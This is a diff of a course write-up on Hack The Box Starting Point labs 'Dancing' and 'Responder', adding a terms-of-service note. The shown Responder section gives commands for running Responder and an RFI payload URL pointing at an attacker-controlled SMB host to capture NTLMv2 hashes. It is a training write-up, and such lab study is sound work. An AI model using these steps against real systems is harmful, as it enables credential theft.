@@ -111,7 +111,7 @@ The summary is based on a surface-level review of the article rather than an in-
 
 # A) HTB Dancing. Ratkaise HackTheBox.com: Starting Point: Tier 0: Dancing.
 
-**Note:** To comply with Hack The Box’s Terms of Service (TOS), this report does not include a detailed step-by-step walkthrough  of the solution.
+**Note**: Hack The Box allows publishing solutions for Starting Point machines. However, its Terms of Service generally prohibits sharing walkthroughs for other machines. Therefore, to follow best practices and respect the platform’s guidelines, this report focuses on the overall workflow and exploitation logic rather than step-by-step instructions or direct answers.
 
 **<ins>1. Overall Objective</ins>**
 
@@ -193,6 +193,8 @@ The summary is based on a surface-level review of the article rather than an in-
 
 # B) HTB Responder. Ratkaise HackTheBox.com: Starting Point: Tier 1: Responder.
 
+**Note**: Hack The Box allows publishing solutions for Starting Point machines. However, its Terms of Service generally prohibits sharing walkthroughs for other machines. Therefore, to follow best practices and respect the platform’s guidelines, this report focuses on the overall workflow and exploitation logic rather than step-by-step instructions or direct answers.
+
 **<ins>1. Overall Objective</ins>**
 
 - Exploiting a misconfigured web application that allows remote file inclusion (RFI).
@@ -241,7 +243,7 @@ The summary is based on a surface-level review of the article rather than an in-
 	- **RFI**: Making the web server attempt to load a file from a remote source (e.g. the attacker's machine). If the remote source acts as an SMB server, the web server will try to access the SMB resource through the NTLM authentication process, which can lead to NTLM authentication leakage
 
 **C) Responder & NTLM Hash Capture**
-- Note: If a firewall has been configured, all incoming traffic should be allowed on TCP port 445 for the Responder to catch the hash: `sudo ufw allow 445/tcp`
+- **Note**: If a firewall has been configured, all incoming traffic should be allowed on TCP port 445 for the Responder to catch the hash: `sudo ufw allow 445/tcp`
 - To run the responder: `sudo responder -I tun0` or `sudo python3 /usr/share/responder/Responder.py – I tun0`
 - To execute the RFI exploit: `http://{domain_name}/?{parameter_name}=//{attacker_IP}/somefile`
 - With the Responder running and acting as a fake SMB server, the RFI triggers the target machine to authenticate to the attacker. This results in Responder capturing the NTLMv2 hash, including the username, domain, and challenge-response data. 
